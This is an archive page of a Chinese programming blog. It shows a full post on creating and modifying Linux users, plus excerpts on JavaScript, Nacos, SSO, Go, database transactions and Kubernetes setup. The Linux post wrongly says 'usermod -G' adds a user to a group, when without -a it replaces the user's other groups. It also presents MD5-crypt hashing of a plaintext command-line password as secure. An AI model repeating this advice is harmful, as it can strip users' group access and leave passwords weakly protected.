		在Linux中，可以使用useradd命令来创建新用户。以下是创建新用户的基本步骤：
打开终端或命令行界面。输入以下命令并按下回车键创建新用户： sudo useradd -m -s /bin/bash username 其中，-m选项表示同时创建用户主目录，-s选项指定用户的默认shell为/bin/bash，username则是你想要创建的用户名。
系统会提示你输入管理员密码（如果需要）。输入管理员密码后，按下回车键确认。创建完成后，新用户将出现在系统中，并拥有自己的主目录和默认shell。 请注意，上述步骤假设你有管理员权限（使用sudo命令）。如果你没有管理员权限，请联系系统管理员或拥有管理员权限的用户来创建新用户。
另外，如果你想为新用户设置密码，可以使用passwd命令。输入以下命令并按回车键：
sudo passwd username 其中，username是你刚刚创建的用户名。系统会提示你输入新密码并确认。
除了上述步骤，还可以使用其他选项和参数来定制新用户的创建方式。以下是一些常用的选项：
-d：指定用户主目录的路径。-s：指定用户的默认shell。-g：指定用户所属的组。-G：指定用户所属的附加组。--uid：指定用户的UID（用户ID）。--home：指定用户主目录的路径。 例如，如果你想创建一个名为john的用户，将其主目录设置为/home/john，并将默认shell设置为/bin/zsh，可以使用以下命令：
sudo useradd -m -s /bin/zsh -d /home/john john 此外，你还可以在创建用户时为其设置密码。可以使用-p选项来指定密码。例如：
sudo useradd -m -s /bin/bash -p $(openssl passwd -1 "password") username 上述命令将使用OpenSSL工具生成密码哈希值，并将其用于创建名为username的用户。请注意，使用密码哈希值可以确保密码安全性。
除了上述命令，还可以使用usermod命令来修改现有用户的属性。例如，如果你想修改用户的密码，可以使用以下命令：
sudo usermod -p $(openssl passwd -1 "new_password") username 上述命令将使用OpenSSL工具生成新的密码哈希值，并将其用于修改名为username的用户的密码。
另外，如果你想将用户添加到其他组或角色中，可以使用usermod命令的-G选项。例如，如果你想将名为john的用户添加到developers组中，可以使用以下命令：
sudo usermod -G developers john 上述命令将john用户添加到developers组中。现在，john用户可以访问该组的权限和资源。
希望这些信息对你有所帮助！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9304af1f2aea69dd5207ae8fc0dcdcaf/" rel="bookmark">
			精通 JavaScript 数据处理大全：手写代码从入门到精通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​🌈个人主页：前端青山
🔥系列专栏：JavaScript篇
🔖人终将被年少不可得之物困其一生
依旧青山,本期给大家带来JavaScript篇专栏内容:JavaScript- 数据处理
目录
1. 实现日期格式化函数
2. 交换a,b的值，不能用临时变量
3. 实现数组的乱序输出
4. 实现数组元素求和
5. 实现数组的扁平化
6. 实现数组去重
7. 实现数组的flat方法
8. 实现数组的push方法
9. 实现数组的filter方法
10. 实现数组的map方法
11. 实现字符串的repeat方法
12. 实现字符串翻转
13. 将数字每千分位用逗号隔开
14. 实现非负大整数相加
13. 实现 add(1)(2)(3)
14. 实现类数组转化为数组
15. 使用 reduce 求和
16. 将js对象转化为树形结构
17. 使用ES5和ES6求函数参数的和
18. 解析 URL Params 为对象
1. 实现日期格式化函数 输入：
dateFormat(new Date('2020-12-01'), 'yyyy/MM/dd') // 2020/12/01 dateFormat(new Date('2020-04-01'), 'yyyy/MM/dd') // 2020/04/01 dateFormat(new Date('2020-04-01'), 'yyyy年MM月dd日') // 2020年04月01日 复制代码 const dateFormat = (dateInput, format)=&gt;{ var day = dateInput.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9304af1f2aea69dd5207ae8fc0dcdcaf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f08b3e643c3c652aa4432ecac6bd07bf/" rel="bookmark">
			Linux上进行Nacos安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nacos安装指南 仅供参考，若有错误，欢迎批评指正！
后期会继续上传docker安装nacos的过程！
1.Windows安装 开发阶段采用单机安装即可。
1.1.下载安装包 在Nacos的GitHub页面，提供有下载链接，可以下载编译好的Nacos服务端或者源代码：
GitHub主页：Github
GitHub的Release下载页：Github下载页
如图：
windows版本使用nacos-server-1.4.6.zip包即可（看自己需求吧）。
1.2.解压 将这个包解压到任意非中文目录下，如图：
目录说明：
bin：启动脚本conf：配置文件 1.3.端口配置 Nacos的默认端口是8848，如果你电脑上的其它进程占用了8848端口，请先尝试关闭该进程。
如果无法关闭占用8848端口的进程，也可以进入nacos的conf目录，修改配置文件中的端口：
修改其中的内容：
1.4.启动 启动非常简单，进入bin目录，结构如下：
然后执行命令即可：
windows命令：
startup.cmd -m standalone 执行后的效果如图：
1.5.访问 在浏览器输入地址：http://127.0.0.1:8848/nacos即可：
默认的账号和密码都是nacos，进入后：
2.Linux安装 Linux或者Mac安装方式与Windows类似。
2.1.安装JDK Nacos依赖于JDK运行，索引Linux上也需要安装JDK才行。
具体jdk的安装可见：Linux上安装JDK
上传jdk安装包，上传到某个目录，例如：/usr/local/
然后解压缩：
tar -xvf 名称 然后重命名为java
配置环境变量：
export JAVA_HOME=/usr/local/java export PATH=$PATH:$JAVA_HOME/bin 设置环境变量：
source /etc/profile 2.2.上传安装包 上传到Linux服务器的某个目录，例如/usr/local/src目录下：
2.3.解压 命令解压缩安装包：
tar -xvf nacos-server-1.4.1.tar.gz 然后删除安装包：
rm -rf nacos-server-1.4.1.tar.gz 目录中最终样式：
目录内部：
2.4.端口配置 与windows中类似
2.5.启动 在nacos/bin目录中，输入命令启动Nacos：
sh startup.sh -m standalone 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f08b3e643c3c652aa4432ecac6bd07bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea94170ea20f9d0c16f4d86b817998cd/" rel="bookmark">
			SingleSignOn单点登录常见协议以及认证交换方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 OAuth 2.0用户登录流程客户端/服务端交互 OpenID Connect用户登录流程客户端/服务端/认证中心交互 JWT (JSON Web Token)用户登录流程客户端/服务端交互JWT的数据结构HeaderPayloadSignature JWT的优点 SAML (Security Assertion Markup Language)用户登录流程客户端/服务端/认证中心交互 Kerberos用户登录流程客户端/服务端/认证中心交互 CAS用户登录认证流程客户端/服务端/认证中心交互 LDAP用户登录认证流程客户端/服务端/认证中心交互 Keycloak身份和访问管理开源解决方案 SSO英文全称Single SignOn，即单点登录。SSO是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。它可以将这次主要的登录映射到其他应用中用于同一个用户的登录的机制。是目前比较流行的企业业务整合的解决方案之一。
OAuth 2.0 OAuth 2.0 是一个开放标准的授权协议，主要用于授权第三方应用程序访问受保护的资源，而不需要用户提供其权限（例如用户名和密码）。尤其在单点登录（SSO）和身份验证方面，OAuth 2.0 在一定的编程中支持这些功能，尽管它不是专门设计的。
以下是OAuth 2.0协议的关键概念和特点：
授权流程： 资源所有者：拥有受保护资源的用户。客户端：希望访问第三方应用程序的资源。授权服务器：负责认证用户并颁发访问令牌（Access Token）的服务器。资源服务器：存储受保护的资源并根据访问令牌提供对这些资源的访问。 角色： 授权服务器：负责验证资源所有者的身份，并根据资源所有者的同意授予访问令牌给客户端。资源服务器：存储受保护的资源，并根据访问令牌验证客户端对资源的访问权限。 授权类型： 授权码授权（Authorization Code Grant）：用于Web应用程序，通过授权码交换访问令牌。隐式授权（Implicit Grant）：适用于浏览器或移动应用，直接从授权端点获取访问令牌。密码授权（Resource Owner Password Credentials Grant）：资源所有者提供用户名和密码直接交换访问令牌。客户端授权授权（Client Credentials Grant）：适用于机器对机器通信，客户端通过自身凭证获取访问令牌。 单点登录（SSO）和身份验证： OAuth 2.0并不是专门为单点登录设计的，但它提供了一些机制，使得可以在多个系统间进行认证并赋予更灵活的功能。通过 OAuth 2.0，用户可以通过授权服务器一次性登录，并在授权内部使用访问令牌访问多个资源。 安全性： OAuth 2.0 使用令牌化的方式，访问令牌代表用户的访问权限，并不是直接暴露用户的权限（例如用户名和密码）。有效管理和保护令牌是保证安全性的关键，包括令牌的时效性、访问范围、加密方式等。 用户登录流程 用户尝试访问客户端应用，但尚未认证。客户端检测到用户未经认证，发起重定向至认证服务器请求认证。用户被重定向至认证服务器，在此进行身份验证，并被询问授权请求。用户授权成功后，认证服务器发回授权码至客户端。客户端使用授权码交换访问令牌（Access Token）和刷新令牌（Refresh Token）。客户端使用 Access Token 请求资源服务器获取用户资源。资源服务器验证 Access Token，若合法则提供用户资源。 客户端/服务端交互 客户端： 负责重定向到认证服务器，并获取访问令牌用于访问资源服务器。服务端： 包括认证服务器和资源服务器，认证服务器负责验证用户身份并颁发令牌，资源服务器验证令牌并提供资源。 虽然OAuth 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea94170ea20f9d0c16f4d86b817998cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a38dd16049593aa3177cbfdd3955f373/" rel="bookmark">
			百度、高德、腾讯、天地图、谷歌、必应地图切片切图工具 MapCutter（旧名MapTiler），支持超大图、高清切片、webgl、leaflet、maptalk、openlayers、cesium等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# MapCutter MapCutter 是制作覆盖图/瓦片图/金字塔图/游戏地图/切图切片的工具，它支持百度、腾讯、高德、天地图、谷歌、必应地图、MapBox等地图服务，是市面上最易用的同类软件，并支持js、webgl、leaflet、maptalks、openlayers、cesium 等地图网页输出，无偏移。可用于景区地图切图、遥感地图切图、游戏地图切图、虚拟城市地图、省市范围地图拼接等地图应用开发。
MapCutter 3.9 使用介绍
# 下载 MapCutter v 3.10.1
最新版本功能：
- 支持地图：百度、腾讯、高德、天地图、必应、谷歌、MapBox。
- 输入能力：
支持超大图片（分辨率大于20480 x 20480，几十G的大图片）
支持输入图片格式：jpg, png, tiff, gif, webp
支持矢量图片 svg
- 输出能力：
支持输出图片格式：png、tif、jpg、webp。可设置切片图片质量。
支持标准（256 x 256）及高清地图切片输出（512 x 512)，适合手机及视网膜屏查看。
支持10-30级地图切图。
支持自定义图片路径，如/z/x_y.png 或 /z/x/y.png。
支持多版本地图网页输出：
Baidu : v2、v3、maptalks
BaiduGL: gl, openlayers, cesium
Tencent : v2、gl、leaflet、cesium
Gaode : v1、v2(gl)、leaflet、maptalks、openlayers、cesium
TianDiTu : v3、v4、leaflet, maptalks、openlayers、cesium
Bing : js、leaflet、openlayers、cesium
Google : js、leaflet、maptalks、openlayers、cesium
MapBox：gl、leaflet
支持多地图无缝拼接，可用该功能生成省、市范围的大规模地图。
支持自定义网页输出模版。
- 快速校准地图解决方案：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a38dd16049593aa3177cbfdd3955f373/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1df4890aa12c1216449c1841ddd5511a/" rel="bookmark">
			golang 格式化时间总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		golang 中经常需要格式化时间和日期来满足不同的业务需求,下面总结格式化时间日期中遇到的问题。
golang time包 时间日期格式化定义 go 的 time package 提供了time.Format函数，用来对时间进行格式化输出;
类似的还有time.Parse用来解析字符串类型的时间到time.Time。这是两个互逆的函数。
下面看golang中time包对于时间的详细定义 • 月份 1, 01, Jan, January
• 日　2, 02, _2
• 时　3,03,15,PM,pm,AM,am
• 分　4,04
• 秒　5,05
• 年　06,2006
• 时区 -07,-0700,Z0700,Z07:00,-07:00,MST
• 周几 Mon,Monday
比如小时的表示(原定义是下午3时，也就是15时) • 3 用12小时制表示，去掉前导0
• 03 用12小时制表示，保留前导0
• 15 用24小时制表示，保留前导0
• 03pm 用24小时制am/pm表示上下午表示，保留前导0
• 3pm 用24小时制am/pm表示上下午表示，去掉前导0
又比如月份 • 1 数字表示月份，去掉前导0
• 01 数字表示月份，保留前导0
• Jan 缩写单词表示月份
• January 全单词表示月份
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1df4890aa12c1216449c1841ddd5511a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bef600f0ab36439a9cfedaf2cfa74c1/" rel="bookmark">
			事务的四个特性、四个隔离级别以及数据库的常用锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		事务的四个特性、四个隔离级别以及数据库的常用锁
四大特性
事务的四大特性，通常被称为ACID特性，是数据库管理系统（DBMS）确保事务处理的关键属性。这四大特性分别是：
原子性（Atomicity）： 原子性要求事务是一个不可分割的单位，要么全部执行，要么全部不执行。如果事务中的任何一部分操作失败，整个事务都必须回滚到最初状态，没有部分完成的情况。
一致性（Consistency）： 一致性确保事务使数据库从一个一致性状态转变为另一个一致性状态。在事务执行前和执行后，数据库必须保持一致性。例如，在银行转账中，无论操作成功与否，账户总额必须保持一致。
隔离性（Isolation）： 隔离性指多个事务可以并发执行，但其执行的效果不能相互影响。每个事务应该感觉好像它是系统中唯一运行的事务一样，而不受其他并发事务的影响。这有助于防止并发事务之间的数据不一致性问题。
持久性（Durability）： 持久性确保一旦事务提交，其结果将永久保存在数据库中，即使系统崩溃或重新启动，提交的更改也不会丢失。
并发问题
数据库并发访问可能导致多种问题，主要与多个事务同时操作数据库时的交互有关。并发访问所产生的问题，在有些场景下可能是允许的，但是有些场景下可能是致命的。
脏读（Dirty Read）： 一个事务读取了另一个事务尚未提交的数据。如果事务A读取了事务B的未提交数据，而事务B后来回滚了，那么事务A读取的数据就是脏数据。
不可重复读（Non-repeatable Read）： 一个事务在两次读取同一数据之间，该数据被其他事务修改，导致两次读取的结果不同。这可能导致事务在处理相同数据时得到不一致的结果。
幻读（Phantom Read）： 一个事务按相同的查询条件重新读取已检索的数据，但在两次读取之间，其他事务插入了新的数据，导致第二次读取的结果不同。这与不可重复读不同，因为幻读涉及到一批数据整体的变化。
丢失修改（Lost Update）： 两个事务同时读取相同的数据，然后都进行修改，并尝试提交。由于事务是并发执行的，可能存在其中一个事务的修改被覆盖，导致数据的丢失。
死锁（Deadlock）： 多个事务相互等待对方释放锁资源，导致它们无法继续执行。这是一种阻塞现象，需要通过某种机制来检测和解除死锁。
这些问题在多用户、多事务并发访问数据库时可能出现，为了处理这些问题，数据库系统提供了不同的隔离级别，例如读未提交、读已提交、可重复读和串行化，以允许开发人员根据应用的需求选择适当的隔离级别。
四个隔离级别
事务的四个隔离级别是指在数据库管理系统中，用于控制并发事务之间相互影响的不同级别。这些隔离级别分别是：
读未提交（Read Uncommitted）：
事务可以读取其他未提交事务的数据。
可能导致脏读、不可重复读和幻读等问题。
读已提交（Read Committed）：
事务只能读取已经提交事务所做的修改。
可以避免脏读，但仍可能出现不可重复读和幻读等问题。
可重复读（Repeatable Read）：
事务在开始读取数据（事务开启）时，不允许其他事务对该数据进行修改。
解决了不可重复读问题，但仍可能存在幻读。
串行化（Serializable）：
最高的隔离级别，确保事务按顺序执行，避免脏读、不可重复读和幻读等问题。
提供最高的数据一致性，但可能导致性能下降，因为事务需要等待其他事务释放锁。
脏读 ** 不可重复读** 幻读
Read Uncommited √ √ √
Read Commited × √ √
Repeatable Read × × √
Serializable × × ×
对应的是Up date操作 对应insert操作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bef600f0ab36439a9cfedaf2cfa74c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/332aa318b441853ff104b43afb4787bd/" rel="bookmark">
			k8s1.15安装详细精华版（环境准备、etcd集群安装、harbor私服搭建、高可用集群部署）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、环境准备1、硬件配置2、修改主机名和配置hosts文件3、安装依赖包4、设置防火墙规则、禁用selinux、关闭交换分区1）关闭防火墙2）开启iptables3）关闭交换分区4）禁用selinux 5、调整k8s内核参数6、加载ip_vs模块7、时钟同步、关闭需不需要的系统服务、设置系统日志1）时钟同步2）关闭需不需要的系统服务3）设置系统日志 二、搭建etcd集群1、环境信息2、设置环境变量3、cfssl下载4、ETCD下载4、复制可执行文件到其余master节点5、生成etcd CA、etcd证书（仅在一台机器上操作，然后scp到其他机器）6、ETCD配置文件7、创建etcd.service配置文件8、复制配置文件及启动文件到其余主节点9、检查etcd集群状态（cd /root/etcd-v3.3.12/）10、etcd集群的相关命令操作11、etcd集群备份 三、Harbor - 企业级 Docker 私有仓库1、底层环境依赖2、habor地址1）解压软件包： tar xvf harbor-offline-installer-&lt;version&gt;.tgz2）配置文件harbor.cfg释义 3、制作自签名证书文件1）创建ca证书2）证书签名3）签证证书 4、运行脚本进行安装5、访问测试6、上传镜像进行上传测试1）指定镜像仓库地址2）下载测试镜像3）给镜像重新打标签4）登录进行认证并推送到私服 7、其它 Docker 客户端下载测试（远程机器）1）指定镜像仓库地址2）下载测试镜像 8、Harbor 原理说明1）软件资源介绍2）habor的主要组件（6个组件）3）Harbor 特性4）Harbor 认证过程5）Harbor 认证流程 四、k8s高可用集群1、硬件配置2、配置主机名3、ssh免秘钥登录4、初始化脚本5、安装docker18.06版本6、安装kube组件7、所有节点时间同步计划任务8、etcd集群安装以及高可用9、kubeadm初始化1、拉取镜像2、编写集群初始化的配置文件（某一个节点操作即可；如192.168.137.12）3、集群初始化（某一个节点操作即可；如192.168.137.12）4、完成会生成加入集群命令，在其余节点执行加入集群命令5、配置admin.conf文件来操作集群6、部署flannel网络（提前导入镜像quay.io/coreos/flannel:v0.11.0-amd64） 10、查看是否为IPVS模式11、验证dns12、查看apiserver信息13、将k8s集群中主节点也可以运行pod资源14、apiserer的高可用验证15、查看集群状态16、使用kubeadm创建完Kubernetes集群后, 默认会在/etc/kubernetes/pki目录下存放集群中需要用到的证书文件, 整体结构如下图所示: 一、环境准备 1、硬件配置 192.168.137.11 CentOS7.7.1908 2核2G+50G存储 192.168.137.12	CentOS7.7.1908 2核2G+50G存储 192.168.137.13	CentOS7.7.1908 2核2G+50G存储 192.168.137.14	CentOS7.7.1908 2核2G+50G存储 2、修改主机名和配置hosts文件 对应的主机上执行
hostnamectl set-hostname k8s-m1 hostnamectl set-hostname k8s-m2 hostnamectl set-hostname k8s-m3 hostnamectl set-hostname habor 所有主机上执行
echo '192.168.137.11 k8s-m1' &gt;&gt; /etc/hosts echo '192.168.137.12 k8s-m2' &gt;&gt; /etc/hosts echo '192.168.137.13 k8s-m3' &gt;&gt; /etc/hosts echo '192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/332aa318b441853ff104b43afb4787bd/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/35/">«</a>
	<span class="pagination__item pagination__item--current">36/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/37/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>